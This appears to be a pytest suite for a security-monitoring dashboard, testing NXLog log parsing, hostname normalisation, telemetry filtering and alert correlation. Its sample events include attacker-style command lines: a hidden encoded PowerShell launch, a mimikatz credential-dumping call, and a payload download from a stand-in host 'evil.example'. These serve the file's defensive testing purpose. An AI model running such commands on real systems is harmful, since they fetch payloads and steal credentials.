import os
import json
import tempfile
import pytest
from streamlit.testing.v1 import AppTest

from analysis.parser import NXLogReader
from analysis.normalize import (
    LogNormalizer,
    resolve_canonical_hostname,
    endpoint_matches_filter,
    resolve_source_filter_code,
    event_matches_source_filter,
    compute_filtered_telemetry_scope,
    normalize_events,
    build_endpoint_inventory,
    filter_telemetry_by_endpoint,
)
from agents.detection_agent import DetectionAgent
from agents.correlation_agent import CorrelationAgent


def _make_sample_telemetry():
    """Creates mixed-source, mixed-endpoint telemetry for unit testing filter & correlation scoping."""
    events = [
        # 1. Real NXLog Harsha security events (with verified alias variations)
        {
            "event_id": 4625,
            "timestamp": "2026-04-11T10:00:01Z",
            "hostname": "HARSHA-PC",
            "raw_hostname": "HARSHA-PC",
            "user": "HarshaUser",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "net use \\\\127.0.0.1\\IPC$",
            "process_name": "net.exe",
            "severity": "high",
            "record_id": 9001,
            "is_diagnostic": False,
        },
        {
            "event_id": 4688,
            "timestamp": "2026-04-11T10:00:05Z",
            "hostname": "harsha.local",
            "raw_hostname": "harsha.local",
            "user": "HarshaUser",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "process_name": "powershell.exe",
            "severity": "critical",
            "record_id": 9002,
            "is_diagnostic": False,
        },
        # 2. Diagnostic probe from Harsha (must be excluded from security telemetry stream)
        {
            "event_id": 9999,
            "timestamp": "2026-04-11T10:00:10Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "SYSTEM",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "AdaptiveSentinel-Diagnostic",
            "command_line": "SentinelLiveTest999",
            "process_name": "powershell.exe",
            "severity": "low",
            "record_id": 9003,
            "is_diagnostic": True,
        },
        # 3. Real NXLog event from another endpoint (LAPTOP-GEEF5A3A)
        {
            "event_id": 4625,
            "timestamp": "2026-04-11T10:00:15Z",
            "hostname": "LAPTOP-GEEF5A3A",
            "raw_hostname": "LAPTOP-GEEF5A3A",
            "user": "sujith",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "whoami /all",
            "process_name": "whoami.exe",
            "severity": "medium",
            "record_id": 9004,
            "is_diagnostic": False,
        },
        # 4. Simulated / Synthetic event claiming Harsha hostname
        {
            "event_id": 4688,
            "timestamp": "2026-04-11T10:00:20Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "SimulatedUser",
            "source": "synthetic",
            "source_type": "synthetic",
            "provider": "Simulated-Generator",
            "command_line": "mimikatz.exe privilege::debug",
            "process_name": "mimikatz.exe",
            "severity": "critical",
            "record_id": 9005,
            "is_diagnostic": False,
        },
        # 5. API Simulation event
        {
            "event_id": 4104,
            "timestamp": "2026-04-11T10:00:25Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "ApiTester",
            "source": "api_simulation",
            "source_type": "api_simulation",
            "provider": "API-Webhook",
            "command_line": "Invoke-WebRequest http://evil.example/payload",
            "process_name": "powershell.exe",
            "severity": "high",
            "record_id": 9006,
            "is_diagnostic": False,
        },
        # 6. Ambiguous UNKNOWN_HOST event on real_nxlog_windows
        {
            "event_id": 4624,
            "timestamp": "2026-04-11T10:00:30Z",
            "hostname": "UNKNOWN_HOST",
            "raw_hostname": "UNKNOWN_HOST",
            "user": "ANONYMOUS",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "N/A",
            "process_name": "lsass.exe",
            "severity": "low",
            "record_id": 9007,
            "is_diagnostic": False,
        },
    ]
    return normalize_events(events)


def test_hostname_alias_normalization_and_raw_preservation():
    """Requirement 10: Verified aliases normalize to Harsha while preserving raw_hostname and never collapsing UNKNOWN_HOST."""
    assert resolve_canonical_hostname("Harsha") == "Harsha"
    assert resolve_canonical_hostname("HARSHA") == "Harsha"
    assert resolve_canonical_hostname("HARSHA-PC") == "Harsha"
    assert resolve_canonical_hostname("harsha.local") == "Harsha"
    assert resolve_canonical_hostname("harsha-laptop") == "Harsha"

    # Ambiguous / unrelated hosts must NEVER collapse into Harsha
    for non_harsha in ["UNKNOWN_HOST", "UNKNOWN", "LOCALHOST", "127.0.0.1", "N/A", "", None, "LAPTOP-GEEF5A3A", "LAPTOP-2", "WIN-SEC-03"]:
        resolved = resolve_canonical_hostname(non_harsha)
        assert resolved != "Harsha", f"{non_harsha!r} should never resolve to Harsha"
        assert not endpoint_matches_filter(non_harsha, "Harsha")

    events = _make_sample_telemetry()
    assert events[0]["hostname"] == "Harsha"
    assert events[0]["raw_hostname"] == "HARSHA-PC"
    assert events[1]["hostname"] == "Harsha"
    assert events[1]["raw_hostname"] == "harsha.local"


def test_source_and_endpoint_scoping_excludes_non_matching_and_zero_evidence_incidents():
    """Requirements 1, 2, 3, 6, 7, 8: Source + Endpoint filter strictly scopes events, alerts, incidents, and counts."""
    events = _make_sample_telemetry()
    det = DetectionAgent()
    corr = CorrelationAgent()

    alerts = det.detect([e for e in events if not e.get("is_diagnostic")])
    active_incidents = corr.correlate(alerts)

    # Inject a stale historical zero-evidence incident claiming Harsha or another host
    stale_zero_incident = {
        "incident_id": "INC-8CD2F1",
        "severity": "High",
        "incident_name": "Historical Snapshot Without Active Window Evidence",
        "affected_host": "Harsha",
        "affected_hosts": ["Harsha"],
        "affected_user": "HarshaUser",
        "alert_count": 12,
        "window_alert_count": 0,
        "alerts": [],
        "telemetry_sources": ["real_nxlog_windows"],
    }
    other_host_incident = {
        "incident_id": "INC-85D28A",
        "severity": "High",
        "incident_name": "Other Host Historical Incident",
        "affected_host": "LAPTOP-GEEF5A3A",
        "affected_hosts": ["LAPTOP-GEEF5A3A"],
        "affected_user": "sujith",
        "alert_count": 5,
        "window_alert_count": 0,
        "alerts": [],
        "telemetry_sources": ["real_nxlog_windows"],
    }
    all_incidents = active_incidents + [stale_zero_incident, other_host_incident]

    # Verify filter_telemetry_by_endpoint excludes zero-evidence historical snapshots and other hosts
    real_events = [e for e in events if not e.get("is_diagnostic") and e.get("source") == "real_nxlog_windows"]
    real_inc = [
        i for i in all_incidents
        if "real_nxlog_windows" in (i.get("telemetry_sources") or [])
    ]
    f_logs, f_incs = filter_telemetry_by_endpoint(real_events, real_inc, "Harsha")
    assert len(f_logs) == 2
    assert len(f_incs) == 1
    assert f_incs[0]["incident_id"] not in ("INC-8CD2F1", "INC-85D28A")
    assert f_incs[0]["affected_host"] == "Harsha"
    assert f_incs[0]["affected_hosts"] == ["Harsha"]
    assert f_incs[0]["window_alert_count"] > 0
    assert len(f_incs[0]["alerts"]) > 0

    # Verify compute_filtered_telemetry_scope for REAL NXLOG WINDOWS + Harsha
    scope = compute_filtered_telemetry_scope(
        events,
        selected_source="REAL NXLOG WINDOWS (real_nxlog_windows)",
        selected_endpoint="Harsha",
    )

    # Only the 2 real NXLog Harsha security events should remain in unique_security_events
    assert len(scope["security_events"]) == 2
    assert len(scope["unique_security_events"]) == 2
    for ev in scope["unique_security_events"]:
        assert ev["source"] == "real_nxlog_windows"
        assert ev["hostname"] == "Harsha"
        assert not ev.get("is_diagnostic", False)
        assert ev["raw_hostname"] in ("HARSHA-PC", "harsha.local")

    # Alerts must only belong to Harsha real_nxlog_windows
    assert len(scope["security_alerts"]) == 2
    for al in scope["security_alerts"]:
        assert al["event"]["source"] == "real_nxlog_windows"
        assert al["hostname"] == "Harsha"

    # Incidents must only contain Harsha evidence and non-zero supporting alerts
    assert len(scope["active_incidents"]) == 1
    inc = scope["active_incidents"][0]
    assert inc["affected_host"] == "Harsha"
    assert inc["affected_hosts"] == ["Harsha"]
    assert inc["window_alert_count"] > 0
    assert len(inc["alerts"]) == inc["window_alert_count"]
    for al in inc["alerts"]:
        assert al["hostname"] == "Harsha"
        assert al["event"]["source"] == "real_nxlog_windows"

    # Severity distribution must sum to unique_security_events count
    assert sum(scope["severity_counts"].values()) == len(scope["unique_security_events"])

    # Selecting ALL SOURCES and ALL ENDPOINTS restores the broader view
    all_scope = compute_filtered_telemetry_scope(
        events,
        selected_source="ALL SOURCES",
        selected_endpoint="ALL ENDPOINTS",
    )
    assert len(all_scope["unique_security_events"]) == 6


def test_nxlog_reader_incremental_sync_and_malformed_lines():
    """Requirements 4, 5, 11: Incremental NXLog sync ingests new lines once, reports no new events on repeat, and handles malformed lines safely."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_file = os.path.join(tmpdir, "windows-events.log")
        cursor_file = os.path.join(tmpdir, "nxlog_cursor.json")

        line1 = json.dumps({
            "EventTime": "2026-04-11 12:00:01",
            "Hostname": "HARSHA-PC",
            "EventID": 4625,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "WARNING",
            "RecordNumber": 50001,
            "Message": "An account failed to log on.",
        })
        line2 = json.dumps({
            "EventTime": "2026-04-11 12:00:05",
            "Hostname": "Harsha",
            "EventID": 4688,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "CRITICAL",
            "RecordNumber": 50002,
            "CommandLine": "powershell.exe -enc AAAA",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        })

        with open(log_file, "w", encoding="utf-8") as f:
            f.write(line1 + "\n")
            f.write(line2 + "\n")

        reader = NXLogReader(log_file=log_file, cursor_file=cursor_file)
        batch1 = reader.read_events(incremental=True)
        assert len(batch1) == 2
        assert batch1[0]["raw_hostname"] == "HARSHA-PC"
        assert batch1[0]["provider"] == "Microsoft-Windows-Security-Auditing"
        assert batch1[1]["event_id"] == 4688
        assert reader.last_error is None

        # Second read with no new lines -> returns 0 events and no error
        batch2 = reader.read_events(incremental=True)
        assert len(batch2) == 0
        assert reader.last_error is None

        # Append a new event from Harsha
        line3 = json.dumps({
            "EventTime": "2026-04-11 12:01:00",
            "Hostname": "Harsha",
            "EventID": 4672,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "INFO",
            "RecordNumber": 50003,
            "Message": "Special privileges assigned to new logon.",
        })
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(line3 + "\n")

        batch3 = reader.read_events(incremental=True)
        assert len(batch3) == 1
        assert batch3[0]["event_id"] == 4672
        assert batch3[0]["record_id"] == 50003

        # Malformed / truncated JSON line test: parse_line and get_recent_events safely handle malformed lines without crashing
        malformed_line = "{bad json line without closing brace\n"
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(malformed_line)
        parsed_fallback = reader.parse_line(malformed_line)
        assert parsed_fallback is not None
        assert parsed_fallback["source"] == "real_nxlog_windows"
        recent = reader.get_recent_events(max_events=50)
        assert len(recent) == 4


def test_receiver_to_dashboard_live_marker_visibility_20261012_010159(tmp_path):
    """
    Regression test for confirmed receiver log event:
    2026-10-12 01:02:02 Harsha INFO 1000 HARSHA\\Harsha ADAPTIVESENTINEL_LIVE_20261012_010159
    Verifies all 8 requirements:
    1. Parses timestamp = 2026-10-12 01:02:02
    2. Parses hostname = Harsha and raw_hostname = Harsha
    3. Parses event_id = 1000
    4. Parses user = Harsha
    5. Preserves ADAPTIVESENTINEL_LIVE_20261012_010159 in description, message, and raw_line
    6. Assigns source/source_type = real_nxlog_windows and is_diagnostic = False
    7. Appears in filtered live stream for REAL NXLOG WINDOWS + Harsha and matches search query
       even when followed by >400 noisy background Event ID 5379 events
    8. Does not create a false security alert or correlated incident, and does not duplicate on repeat sync
    """
    raw_receiver_line = "2026-10-12 01:02:02 Harsha INFO 1000 HARSHA\\Harsha ADAPTIVESENTINEL_LIVE_20261012_010159"

    log_path = tmp_path / "windows-events.log"
    cursor_path = tmp_path / "nxlog_cursor.json"

    # Write the marker followed by 350 background Event ID 5379 events to verify it is never evicted from the 300-event window
    lines = [raw_receiver_line]
    for idx in range(350):
        lines.append(
            f"2026-10-12 01:05:{idx % 60:02d} Harsha AUDIT_SUCCESS 5379 HARSHA\\Harsha "
            f"Credential Manager credentials were read. Read Operation: {idx}"
        )
    log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    reader = NXLogReader(log_file=log_path, cursor_file=cursor_path)
    parsed = reader.parse_line(raw_receiver_line)
    assert parsed is not None
    norm_evt = normalize_events([parsed])[0]

    # Checks 1-6: Exact field provenance and normalization
    assert norm_evt["timestamp"] == "2026-10-12 01:02:02"
    assert norm_evt["hostname"] == "Harsha"
    assert norm_evt["raw_hostname"] == "Harsha"
    assert norm_evt["event_id"] == 1000
    assert norm_evt["user"] == "Harsha"
    assert "ADAPTIVESENTINEL_LIVE_20261012_010159" in norm_evt["description"]
    assert "ADAPTIVESENTINEL_LIVE_20261012_010159" in norm_evt["message"]
    assert "ADAPTIVESENTINEL_LIVE_20261012_010159" in norm_evt["raw_line"]
    assert norm_evt["source"] == "real_nxlog_windows"
    assert norm_evt["source_type"] == "real_nxlog_windows"
    assert norm_evt["severity"] == "Low"
    assert norm_evt["is_diagnostic"] is False

    # Check 7: Preserved in 300-event recent window and visible in filtered scope for REAL NXLOG WINDOWS + Harsha
    recent_300 = normalize_events(reader.get_recent_events(max_events=300))
    non_diag_recent = [e for e in recent_300 if not e.get("is_diagnostic")]
    assert len(non_diag_recent) == 300
    marker_matches_in_recent = [
        e for e in non_diag_recent
        if "ADAPTIVESENTINEL_LIVE_20261012_010159" in str(e.get("description", ""))
    ]
    assert len(marker_matches_in_recent) == 1

    scope = compute_filtered_telemetry_scope(
        recent_300,
        selected_source="REAL NXLOG WINDOWS (real_nxlog_windows)",
        selected_endpoint="Harsha",
    )
    stream_events = scope["unique_security_events"]
    found_in_stream = [
        e for e in stream_events
        if "ADAPTIVESENTINEL_LIVE_20261012_010159" in str(e.get("description", ""))
        and "ADAPTIVESENTINEL_LIVE_20261012_010159" in str(e.get("message", ""))
    ]
    assert len(found_in_stream) == 1

    # Check 8: Does not create a false security alert or correlated security incident
    det_alerts = DetectionAgent().detect([norm_evt])
    assert det_alerts == []
    corr_incidents = CorrelationAgent().correlate(det_alerts)
    assert corr_incidents == []

    # Repeated incremental reads do not duplicate the event
    batch_first = normalize_events(reader.read_events(incremental=True))
    batch_second = normalize_events(reader.read_events(incremental=True))
    assert len(batch_first) == 351
    assert len(batch_second) == 0


def test_dashboard_apptest_real_nxlog_harsha_and_sync_button(monkeypatch, tmp_path):
    """Requirements 1-9, 12: Full Streamlit AppTest verifying filter controls, sync button, live marker search, and cross-sector consistency."""
    import shutil
    import config.settings as cfg_settings
    import analysis.parser as parser_mod

    protected_paths = [
        r"C:\AdaptiveSentinel\windows-events.log",
        "data/nxlog_cursor.json",
        "knowledge_base/sentinel_kb.db",
        "data/soar_audit.db",
    ]
    before_exists = {p: os.path.exists(p) for p in protected_paths}
    orig_cursor_offset = (
        json.loads(open("data/nxlog_cursor.json", "r", encoding="utf-8").read()).get("byte_offset", 0)
        if os.path.exists("data/nxlog_cursor.json")
        else None
    )

    # Isolate cursor file to tmp_path so AppTest button clicks never mutate data/nxlog_cursor.json on disk
    tmp_cursor = tmp_path / "nxlog_cursor_test.json"
    if os.path.exists("data/nxlog_cursor.json"):
        shutil.copyfile("data/nxlog_cursor.json", tmp_cursor)
    monkeypatch.setattr(cfg_settings, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(parser_mod, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)

    at = AppTest.from_file("dashboard/app.py", default_timeout=30)
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception on initial load: {at.exception}"

    # Select REAL NXLOG WINDOWS (real_nxlog_windows) and Harsha
    source_sb = [sb for sb in at.selectbox if "Select Telemetry Source" in sb.label][0]
    host_sb = [sb for sb in at.selectbox if "Filter by Endpoint Host" in sb.label][0]

    source_sb.select("REAL NXLOG WINDOWS (real_nxlog_windows)")
    host_sb.select("Harsha")
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception after selecting Harsha filter: {at.exception}"

    # Helper to find metric by substring
    def get_metric_val(substr):
        for m in at.metric:
            if substr in m.label:
                return m.value
        return None

    # Verify KPI metrics are strictly consistent with Harsha's real security events
    expected_harsha_cnt = str(len([
        e for e in at.session_state["nxlog_security_logs"]
        if e.get("hostname") == "Harsha" and e.get("source") == "real_nxlog_windows"
    ]))
    assert int(expected_harsha_cnt) >= 300
    assert get_metric_val("Total Logs Analyzed") == expected_harsha_cnt
    assert get_metric_val("Live NXLog Stream") == expected_harsha_cnt
    assert get_metric_val("High/Critical Incidents") == "0"
    lat_metric_val = get_metric_val("Pipeline Latency")
    assert lat_metric_val is not None and lat_metric_val != "15.00 ms" and lat_metric_val != "N/A" and lat_metric_val.endswith(" ms")

    # Verify ADAPTIVESENTINEL_LIVE_20261012_010159 is present in nxlog_security_logs and searchable in Sector 1
    if os.path.exists(r"C:\AdaptiveSentinel\windows-events.log"):
        sec_matches = [
            e for e in at.session_state["nxlog_security_logs"]
            if "ADAPTIVESENTINEL_LIVE_20261012_010159" in str(e.get("description", ""))
        ]
        assert len(sec_matches) == 1
        assert sec_matches[0]["hostname"] == "Harsha"
        assert sec_matches[0]["event_id"] == 1000
        assert sec_matches[0]["source"] == "real_nxlog_windows"
        assert sec_matches[0]["is_diagnostic"] is False

        # Search for ADAPTIVESENTINEL_LIVE_20261012_010159 in Near-Real-Time Live Event Stream search input
        search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
        assert len(search_inputs) == 1
        search_inputs[0].set_value("ADAPTIVESENTINEL_LIVE_20261012_010159")
        at.run(timeout=30)
        assert not at.exception

        # Verify the stream table has the matching row (1 row with Event ID 1000 and Hostname Harsha)
        matching_dfs = [
            df.value for df in at.dataframe
            if "Description" in df.value.columns
            and df.value["Description"].astype(str).str.contains("ADAPTIVESENTINEL_LIVE_20261012_010159").any()
        ]
        assert len(matching_dfs) == 1
        assert len(matching_dfs[0]) == 1
        assert matching_dfs[0].iloc[0]["Event ID"] == "1000"
        assert matching_dfs[0].iloc[0]["Hostname"] == "Harsha"

        # Clear search input
        search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
        search_inputs[0].set_value("")
        at.run(timeout=30)

    # Verify every active incident for Harsha has window_alert_count > 0 and only Harsha real_nxlog_windows evidence
    active_harsha_incs = [
        inc for inc in at.session_state["nxlog_incidents"]
        if not inc.get("is_diagnostic")
        and int(inc.get("window_alert_count", 0) or 0) > 0
        and len(inc.get("alerts") or []) > 0
        and inc.get("affected_host") == "Harsha"
    ]
    zero_window_ids = {
        inc["incident_id"]
        for inc in at.session_state["nxlog_historical_incidents"]
    }
    for inc in active_harsha_incs:
        assert inc["incident_id"] not in zero_window_ids
        assert inc["affected_host"] == "Harsha"
        assert inc["affected_hosts"] == ["Harsha"]
        assert inc["window_alert_count"] > 0
        assert len(inc["alerts"]) > 0
        for al in inc["alerts"]:
            assert al["hostname"] == "Harsha"
            assert al["event"]["source"] == "real_nxlog_windows"

    assert get_metric_val("Correlated Incidents") == str(len(active_harsha_incs))

    # Verify nxlog_security_logs has no diagnostic probes
    for log_ev in at.session_state["nxlog_security_logs"]:
        assert not log_ev.get("is_diagnostic", False)
        assert log_ev.get("source") == "real_nxlog_windows"

    # Click 'Synchronize NXLog Real Telemetry'
    sync_btns = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label]
    assert len(sync_btns) == 1
    sync_btns[0].click()
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception on Synchronize click: {at.exception}"

    # Verify feedback reports 'No new events received' (or ingested count if live events arrived) and does not duplicate logs
    feedback = at.session_state["nxlog_sync_feedback"]
    assert feedback is not None
    fb_msg = feedback[1] if isinstance(feedback, (tuple, list)) else feedback.get("message", "")
    assert "No new events received" in fb_msg or "Stream current" in fb_msg or "Ingested" in fb_msg
    assert at.session_state["nxlog_last_sync_time"] != "Never"

    # Verify switching back to ALL SOURCES and ALL ENDPOINTS works cleanly
    source_sb = [sb for sb in at.selectbox if "Select Telemetry Source" in sb.label][0]
    host_sb = [sb for sb in at.selectbox if "Filter by Endpoint Host" in sb.label][0]
    source_sb.select("ALL SOURCES")
    host_sb.select("ALL ENDPOINTS")
    at.run(timeout=30)
    assert not at.exception

    # Verify protected files still exist and production cursor was not altered
    for p, existed in before_exists.items():
        if existed:
            assert os.path.exists(p), f"Protected file {p} was missing after test!"
    if orig_cursor_offset is not None:
        after_cursor_offset = json.loads(open("data/nxlog_cursor.json", "r", encoding="utf-8").read()).get("byte_offset", 0)
        assert after_cursor_offset >= orig_cursor_offset


def test_automatic_receiver_growth_ingestion_and_natural_harsha_events(monkeypatch, tmp_path):
    """
    Verifies:
    1. Multiline Windows Security Event ID 4624 with C:\\Windows\\System32\\services.exe extracts user='SYSTEM'
       (never mistaking file path 'System32' for DOMAIN\\User).
    2. Diverse non-5379 Windows events (4624, 4672, 7040, 1000, 1001) remain visible in the 300-event window
       even when surrounded by >350 background Event ID 5379 records, and routine activity produces zero alerts/incidents.
    3. Dashboard automatically detects newly appended receiver records on file growth and ingests/analyzes them
       incrementally without requiring a manual click on 'Synchronize NXLog Real Telemetry'.
    """
    import config.settings as cfg_settings
    import analysis.parser as parser_mod

    tmp_log = tmp_path / "windows-events.log"
    tmp_cursor = tmp_path / "nxlog_cursor.json"

    multiline_4624 = (
        "2026-10-12 01:36:14 Harsha AUDIT_SUCCESS 4624 N/A An account was successfully logged on.\n"
        "\tSubject:\n"
        "\t\tAccount Name:\t\tHARSHA$\n"
        "\t\tAccount Domain:\t\tWORKGROUP\n"
        "\tLogon Information:\n"
        "\t\tLogon Type:\t\t5\n"
        "\tNew Logon:\n"
        "\t\tSecurity ID:\t\tS-1-5-18\n"
        "\t\tAccount Name:\t\tSYSTEM\n"
        "\t\tAccount Domain:\t\tNT AUTHORITY\n"
        "\tProcess Information:\n"
        "\t\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\n"
    )
    event_4672 = (
        "2026-10-12 01:36:15 Harsha AUDIT_SUCCESS 4672 N/A Special privileges assigned to new logon.\n"
        "\tSubject:\n"
        "\t\tAccount Name:\t\tSYSTEM\n"
        "\t\tAccount Domain:\t\tNT AUTHORITY\n"
    )
    event_7040 = (
        "2026-10-12 01:36:16 Harsha INFO 7040 NT AUTHORITY\\SYSTEM "
        "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.\n"
    )

    lines = [multiline_4624.rstrip("\n"), event_4672.rstrip("\n"), event_7040.rstrip("\n")]
    for idx in range(340):
        lines.append(
            f"2026-10-12 01:37:{idx % 60:02d} Harsha AUDIT_SUCCESS 5379 HARSHA\\Harsha "
            f"Credential Manager credentials were read. Operation #{idx}"
        )
    tmp_log.write_text("\n".join(lines) + "\n", encoding="utf-8")

    monkeypatch.setattr(cfg_settings, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(parser_mod, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(cfg_settings, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(parser_mod, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)

    reader = NXLogReader(log_file=tmp_log, cursor_file=tmp_cursor)
    parsed_4624 = normalize_events([reader.parse_line(multiline_4624)])[0]
    assert parsed_4624["event_id"] == 4624
    assert parsed_4624["hostname"] == "Harsha"
    assert parsed_4624["user"] == "SYSTEM"
    assert parsed_4624["source"] == "real_nxlog_windows"
    assert parsed_4624["is_diagnostic"] is False

    # Routine Windows events (4624, 4672, 7040) must NOT create detection alerts or security incidents
    routine_batch = normalize_events([
        reader.parse_line(multiline_4624),
        reader.parse_line(event_4672),
        reader.parse_line(event_7040),
    ])
    assert DetectionAgent().detect(routine_batch) == []
    assert CorrelationAgent().correlate([]) == []

    # Verify non-5379 events (4624, 4672, 7040) are preserved in get_recent_events(300) despite 340 trailing 5379 events
    recent_300 = normalize_events(reader.get_recent_events(max_events=300))
    recent_ids = {e["event_id"] for e in recent_300}
    assert {4624, 4672, 7040}.issubset(recent_ids)

    # Start dashboard AppTest and select REAL NXLOG WINDOWS + Harsha
    at = AppTest.from_file("dashboard/app.py", default_timeout=30)
    at.run(timeout=30)
    assert not at.exception

    source_sb = [sb for sb in at.selectbox if "Select Telemetry Source" in sb.label][0]
    host_sb = [sb for sb in at.selectbox if "Filter by Endpoint Host" in sb.label][0]
    source_sb.select("REAL NXLOG WINDOWS (real_nxlog_windows)")
    host_sb.select("Harsha")
    at.run(timeout=30)
    assert not at.exception

    # Now append a brand-new genuine Harsha Windows event to tmp_log WITHOUT clicking Synchronize button
    new_natural_line = (
        "2026-10-12 01:39:55 Harsha INFO 7040 NT AUTHORITY\\SYSTEM "
        "The start type of the Windows Installer service was changed from demand start to disabled.\n"
    )
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write(new_natural_line)

    # Trigger a normal dashboard rerun (e.g. searching for 7040) WITHOUT clicking Synchronize
    search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
    search_inputs[0].set_value("Windows Installer service")
    at.run(timeout=30)
    assert not at.exception

    # Verify the newly appended event was automatically ingested into nxlog_security_logs and rendered in the table
    ingested_installer = [
        e for e in at.session_state["nxlog_security_logs"]
        if "Windows Installer service" in str(e.get("description", ""))
    ]
    assert len(ingested_installer) == 1
    assert ingested_installer[0]["event_id"] == 7040
    assert ingested_installer[0]["hostname"] == "Harsha"
    assert ingested_installer[0]["user"] == "SYSTEM"
    assert "Auto-Synchronized" in at.session_state["nxlog_ingestion_status"]


def test_persistent_reset_baseline_browser_reload_filter_stability_and_post_baseline_ingestion(monkeypatch, tmp_path):
    """
    Verifies that:
    1. Clicking 'Reset Dashboard to 0 Logs' establishes a persistent baseline across browser reloads.
    2. Browser reload (new AppTest session) after Reset stays at 0 logs and 0 incidents (does not restore 300 historical logs).
    3. Source ('REAL NXLOG WINDOWS (real_nxlog_windows)') and Endpoint ('Harsha') filters remain stable across Reset and browser reloads.
    4. Newly appended genuine receiver records after the baseline are automatically ingested and displayed (count 0 -> 2),
       and a subsequent browser reload preserves only the 2 post-baseline records without reverting to pre-baseline history.
    5. VPN tunnel IP 172.21.0.1 is excluded from endpoint IP resolution in favor of Harsha's Wi-Fi peer IP.
    """
    import config.settings as cfg_settings
    import analysis.parser as parser_mod

    tmp_log = tmp_path / "windows-events.log"
    tmp_cursor = tmp_path / "nxlog_cursor.json"
    tmp_baseline = tmp_path / "nxlog_demo_baseline.json"
    tmp_filters = tmp_path / "dashboard_filter_state.json"

    # Seed 305 historical pre-baseline records (including Event 5379/4798 and X-VPN 172.21.0.1)
    hist_lines = [
        "2026-10-12 01:00:01 Harsha INFO 20225 N/A The user HARSHA\\Harsha has dialed a connection named X-VPN. TunnelIpAddress = 172.21.0.1",
        "2026-10-12 01:00:02 Harsha AUDIT_SUCCESS 4798 HARSHA\\Harsha A user's local group membership was enumerated.",
    ]
    for idx in range(303):
        hist_lines.append(
            f"2026-10-12 01:10:{idx % 60:02d} Harsha AUDIT_SUCCESS 5379 HARSHA\\Harsha "
            f"Credential Manager credentials were read. Historical #{idx}"
        )
    tmp_log.write_text("\n".join(hist_lines) + "\n", encoding="utf-8")

    monkeypatch.setattr(cfg_settings, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(parser_mod, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(cfg_settings, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(parser_mod, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(cfg_settings, "DEMO_BASELINE_FILE_PATH", tmp_baseline)
    monkeypatch.setattr(cfg_settings, "DASHBOARD_FILTER_STATE_FILE_PATH", tmp_filters)

    def _metric(app_test, label_substr):
        for m in app_test.metric:
            if label_substr in m.label:
                return m.value
        return None

    # --- Session 1: Initial load, select REAL NXLOG WINDOWS + Harsha, then click Reset Dashboard to 0 Logs ---
    at1 = AppTest.from_file("dashboard/app.py", default_timeout=30).run(timeout=30)
    assert not at1.exception
    assert int(_metric(at1, "Total Logs Analyzed")) >= 300

    src_sb = [sb for sb in at1.selectbox if "Select Telemetry Source" in sb.label][0]
    ep_sb = [sb for sb in at1.selectbox if "Filter by Endpoint Host" in sb.label][0]
    src_sb.select("REAL NXLOG WINDOWS (real_nxlog_windows)")
    ep_sb.select("Harsha")
    at1.run(timeout=30)
    assert not at1.exception

    reset_btn = [b for b in at1.button if "Reset Dashboard to 0 Logs" in b.label][0]
    reset_btn.click()
    at1.run(timeout=30)
    assert not at1.exception

    assert _metric(at1, "Total Logs Analyzed") == "0"
    assert _metric(at1, "Live NXLog Stream") == "0"
    assert _metric(at1, "Correlated Incidents") == "0"
    assert _metric(at1, "Pipeline Latency") == "N/A"
    assert tmp_baseline.exists()
    assert tmp_filters.exists()

    # Verify filter dropdowns did NOT revert after clicking Reset
    src_sb_after = [sb for sb in at1.selectbox if "Select Telemetry Source" in sb.label][0]
    ep_sb_after = [sb for sb in at1.selectbox if "Filter by Endpoint Host" in sb.label][0]
    assert src_sb_after.value == "REAL NXLOG WINDOWS (real_nxlog_windows)"
    assert ep_sb_after.value == "Harsha"

    # --- Session 2: Simulate Browser Reload (F5) immediately after Reset ---
    at2 = AppTest.from_file("dashboard/app.py", default_timeout=30).run(timeout=30)
    assert not at2.exception
    assert _metric(at2, "Total Logs Analyzed") == "0"
    assert _metric(at2, "Live NXLog Stream") == "0"
    assert _metric(at2, "Correlated Incidents") == "0"
    assert _metric(at2, "Pipeline Latency") == "N/A"

